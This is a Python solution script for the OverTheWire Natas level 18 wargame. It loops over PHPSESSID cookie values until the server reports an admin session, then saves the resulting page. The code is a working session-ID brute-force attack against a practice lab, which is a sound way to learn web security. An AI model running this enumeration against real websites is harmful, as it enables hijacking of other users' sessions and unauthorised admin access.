import requests
import string
import time

pathToDir = 'C:\\Users\\niroj\\Documents\\Natas\\'
userName = "natas18"
url = "http://natas18.natas.labs.overthewire.org/"
password = open(pathToDir + 'password.txt', 'r').readlines()[17][8:40]
print(password)


# -------------------------- First page ----------------------------

response = requests.get(url, auth = (userName, password))
htmlDoc = response.text

try:
    with open(pathToDir + "scripts\\temp\\index.html", 'w') as htmlContent:
        htmlContent.writelines(htmlDoc)
        print("(+) first page is stored successfully on the path as index.html")
except IOError as err:
    print(f"(-) unfortunately {err}")


# ---------------------------- source index file -------------------------------

response = requests.get(url + 'index-source.html', auth = (userName, password))
htmlDoc = response.text

try:
    with open(pathToDir + "scripts\\temp\\index-source.html", 'w') as htmlSourceContent:
        htmlSourceContent.writelines(htmlDoc)
        print("(+) first page is stored successfully on the path as index-source.html")
except IOError as err:
    print(f"(-) unfortunately {err}")

# -------------------------------- Final Page -------------------------------------

for sessionID in range(1,640):

    cookie = {
        'PHPSESSID': str(sessionID)
    }
    response = requests.get(url, auth = (userName, password), cookies = cookie)
    htmlDoc = response.text

    if ("You are an admin" in htmlDoc):
        print("(+) Here we are! ", sessionID)
        try:  
            with open(pathToDir + "scripts\\temp\\result.html", 'w') as htmlContent:
                htmlContent.writelines(htmlDoc)
                print("(+) first page is stored successfully on the path as result.html")

        except IOError as err:
            print(f"(-) unfortunately {err}")
        break

    else:
        print("(*) Trying ", sessionID)
        
# cookie = response.cookies

# print(cookie)